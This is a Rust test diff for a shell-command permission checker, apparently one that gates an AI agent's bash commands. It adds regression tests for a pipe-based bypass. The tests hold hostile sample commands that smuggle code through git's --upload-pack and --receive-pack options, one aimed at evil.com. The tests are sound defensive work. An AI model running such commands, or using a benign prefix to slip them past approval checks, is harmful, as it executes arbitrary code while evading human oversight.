@@ -4240,6 +4240,51 @@ fn e2e_git_dash_lowercase_c_config_passes() {
 }
 
 #[test]
+fn e2e_git_upload_pack_pipe_bypass_asks() {
+    // Second-opinion review finding (PR #307, 2026-09-26): a read-only prefix
+    // before a `|` waved through whatever dangerous command followed it,
+    // since split_segments() doesn't split on bare `|`.
+    let out = run(
+        &bash("git status | git clone --upload-pack='touch pwned' https://evil.com/x.git"),
+        &[],
+    );
+    assert_eq!(
+        decision(&out),
+        Some("ask"),
+        "git status | git clone --upload-pack=... must still ask: {out}"
+    );
+}
+
+#[test]
+fn e2e_git_receive_pack_pipe_bypass_asks() {
+    let out = run(
+        &bash("git log | git push --receive-pack='touch pwned' origin main"),
+        &[],
+    );
+    assert_eq!(
+        decision(&out),
+        Some("ask"),
+        "git log | git push --receive-pack=... must still ask: {out}"
+    );
+}
+
+#[test]
+fn e2e_git_log_pipe_grep_still_passes() {
+    // Explicitly "allow" (not silent/None) is correct here: this hits a
+    // separate, pre-existing full-command allow.patterns match (only reached
+    // when check_command's deny/ask scan found nothing) that isn't part of
+    // this fix — it's benign since it only ever activates once nothing
+    // dangerous was already found. The unit-level `git_log_pipe_grep_still_passes`
+    // test in main.rs exercises check_command directly and correctly sees None.
+    let out = run(&bash("git log | grep foo"), &[]);
+    assert_eq!(
+        decision(&out),
+        Some("allow"),
+        "a genuinely benign pipeline must not regress into ask: {out}"
+    );
+}
+
+#[test]
 fn e2e_pnpm_dlx_asks() {
     let out = run(&bash("pnpm dlx create-react-app ."), &[]);
     assert_eq!(decision(&out), Some("ask"), "pnpm dlx must ask: {out}");
